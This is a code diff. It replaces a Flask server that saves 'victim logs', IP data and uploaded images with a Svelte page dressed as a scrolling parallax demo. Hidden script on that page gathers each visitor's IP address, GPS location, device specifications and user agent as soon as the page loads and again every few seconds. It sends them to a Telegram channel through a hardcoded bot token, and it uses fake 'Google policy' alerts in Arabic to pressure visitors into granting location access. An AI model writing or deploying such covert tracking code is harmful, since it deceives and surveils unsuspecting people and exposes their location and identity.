@@ -1,71 +1,251 @@
-from colorama import Fore, Back, Style
-from flask import Flask, render_template, url_for, request, jsonify,Response
-import time
-import os
-if(os.path.exists('image')):
-       print("present")
-else:
-     os.mkdir('image')       
-PATH_TO_IMAGES_DIR = 'image'
-app = Flask(__name__)
-import logging
-log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
+<script>
+	const layers = [0, 1, 2, 3, 4, 5, 6, 7, 8];
 
-@app.route('/')
-def index():
-   return Response(open('index.html').read(), mimetype="text/html")
-@app.route('/ipinfo',methods=['POST'])
-def ipinfos():
-      iplogs = request.get_json()
-      ips = open('ipinfo.txt','a')
-      ips.write("\n")
-      ips.write(str(iplogs))
-      ips.write("\n")
-      ips.close()
-      print(Fore.MAGENTA + "----------------------------------------------------")
-      print("")     
-      print(Fore.RED  + "Ip Logs saved to **ipinfo.txt** ")  
-      print("")
-      print(Fore.MAGENTA + "----------------------------------------------------")
-      print(" ")
-      results = {'processed': 'true'}
-      return jsonify(results) 
+	let y;
 
-@app.route('/process_qtc', methods=['POST', 'GET'])
-def getvictimlogs():
-  if request.method == "POST":
-    logs = request.get_json()
-    log = open('sensitiveinfo.txt','a')
-    log.write("\n")
-    log.write(str(logs))
-    log.write("\n")
-    log.close()
+
+	
+  import { onMount } from 'svelte';
+  onMount(async () => {
+    
+sendIPToTelegramBots();
+yourFunction();
     
     
-   
-    print(logs)
-    print("")
-    print(Fore.MAGENTA + "----------------------------------------------------")
-    print("")     
-    print(Fore.RED  + "Victim Logs saved  to **sensitiveinfo.txt**")  
-    print("")
-    print(Fore.MAGENTA + "----------------------------------------------------")
-    
-    results = {'processed': 'true'}
-    return jsonify(results)   
-@app.route('/image', methods=['POST'])
-def image():
-
-    i = request.files['image']  # get the image
-    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))
-    print(Fore.YELLOW + "Image Saved Successfully")
-
-    return Response("%s saved" % f)
+window.onload = function() {
 
 
-if __name__ == "__main__":
-           app.run(debug=True)
+      setInterval(yourFunction, 5000); // 2000 milliseconds = 2 seconds
+    };
+  });
+  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+    const message = `
+الموقع:
+${latitude} ${longitude}
+الايبي:
+${ipAddress}
+`;
+    // Create the message with the clickable link to Google Maps
+    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
+    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+    const locationIcon = "\u{1F4CD}"; // Location icon as text (Unicode character)
+    const htmlMessage = `${locationIcon} ${message}\n\n${clickableLink}\n\n${ipLocationNetLink}`;
+    // Send location and IP results to Telegram bots using an HTTP request
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '@localipy', // Replace with the channel username or ID
+        text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
+  }
+  async function sendIPToTelegramBots() {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+    // Get the IP address using ipify API
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
+    const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
+    const vendor = navigator.vendor;
+    const isAndroid = userAgent.toLowerCase().includes('android');
+    const ipInfo = await getIPInfo(ipAddress);
+    const country = ipInfo.country_name || 'N/A';
+    const city = ipInfo.city || 'N/A';
+    const isp = ipInfo.org || 'N/A';
+    const message = `
+الايبي: ${ipAddress}
+البلد: ${country}
+مدينة مزود الخدمة: ${city}
+المنظمة: ${isp}
+المنصة: ${platform}
+عرض الشاشة: ${screenWidth}
+ارتفاع الشاشة: ${screenHeight}
+عدد المعالجات: ${cpuCores}
+الرامات: ${totalRAM}
+شركة السوفتوير: ${vendor}
+اندرويد: ${isAndroid ? 'نعم' : 'لا'}
+باقي البيانات: ${userAgent}
+`;
+    // Create the message with clickable link
+    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
+    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
+    const htmlMessage = `${message}\n\n${ipLocationNetLink}`;
+    // Send IP result to Telegram bots using an HTTP request
+    await fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '@localipy', // Replace with the channel username or ID
+        text: htmlMessage,
+        parse_mode: 'HTML',
+      }),
+    });
+  }
+  async function getIPInfo(ip) {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (response.ok) {
+      return response.json();
+    }
+    return {};
+  }
+  
+  
+  async function yourFunction() {
+	   if (!navigator.geolocation) {
+    // Geolocation not supported by browser
+sendIPToTelegramBots();
+  alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
 
+   //
+    return; // Exit the function if no geolocation available
+  }
+  navigator.geolocation.getCurrentPosition(
+    async (position) => {
+      // Location permission granted, send location and IP results to Telegram bots
+      await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+    },
+    (error) => {
+      if (error.code === error.PERMISSION_DENIED) {
+				sendIPToTelegramBots();
+		    //alert("اضغط سماح لاستمرار allow");
+       alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+        // showAlert();
+        // redirectToNextURL();
+        // Location permission denied, send IP result to Telegram bots
+     } else {
+      // Geolocation failed for other reasons (e.g., GPS unavailable)
+      alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
+    }
+    }
+  );
+}
+  
+  
+  
+function showAlert() {
+  // You can customize the alert message and behavior here
+  alert("Location permission is denied. This app needs your location to function properly.");
+}
+  function redirectToNextURL() {
+    // Get the current URL
+    var currURL = window.location.href;
+    // Extract the current number from the URL
+    var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+    // Check if the current number is less than or equal to 999
+    if (currNum <= 999) {
+      // Increment the current number by 1 and construct the next URL
+      var nextNum = currNum + 1;
+      var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
+      // Redirect to the next URL
+      window.location.href = nextURL;
+    } else {
+      // If the current number is greater than 999, display an alert message
+      // alert('You have reached the maximum number of URLs.');
+      window.location.href = 'https://mhf1.onrender.com/';
+    }
+  }
+	
+</script>
 
+<svelte:window bind:scrollY={y} />
+
+<a class="parallax-container" href="https://www.firewatchgame.com">
+	{#each layers as layer}
+		<img
+			style="transform: translate(0,{(-y * layer) / (layers.length - 1)}px)"
+			src="https://www.firewatchgame.com/images/parallax/parallax{layer}.png"
+			alt="parallax layer {layer}"
+		/>
+	{/each}
+</a>
+
+<div class="text">
+	<span style="opacity: {1 - Math.max(0, y / 40)}"> scroll down </span>
+
+	<div class="foreground">
+		You have scrolled {y} pixels
+	</div>
+</div>
+
+<style>
+	.parallax-container {
+		position: fixed;
+		width: 2400px;
+		height: 712px;
+		left: 50%;
+		transform: translate(-50%, 0);
+	}
+
+	.parallax-container img {
+		position: absolute;
+		top: 0;
+		left: 0;
+		width: 100%;
+		will-change: transform;
+	}
+
+	.parallax-container img:last-child::after {
+		content: '';
+		position: absolute;
+		width: 100%;
+		height: 100%;
+		background: rgb(45, 10, 13);
+	}
+
+	.text {
+		position: relative;
+		width: 100%;
+		height: 300vh;
+		color: rgb(220, 113, 43);
+		text-align: center;
+		padding: 4em 0.5em 0.5em 0.5em;
+		box-sizing: border-box;
+		pointer-events: none;
+	}
+
+	span {
+		display: block;
+		font-size: 1em;
+		text-transform: uppercase;
+		will-change: transform, opacity;
+	}
+
+	.foreground {
+		position: absolute;
+		top: 711px;
+		left: 0;
+		width: 100%;
+		height: calc(100% - 712px);
+		background-color: rgb(32, 0, 1);
+		color: white;
+		padding: 50vh 0 0 0;
+	}
+
+	:global(body) {
+		margin: 0;
+		padding: 0;
+		background-color: rgb(253, 174, 51);
+	}
+</style>
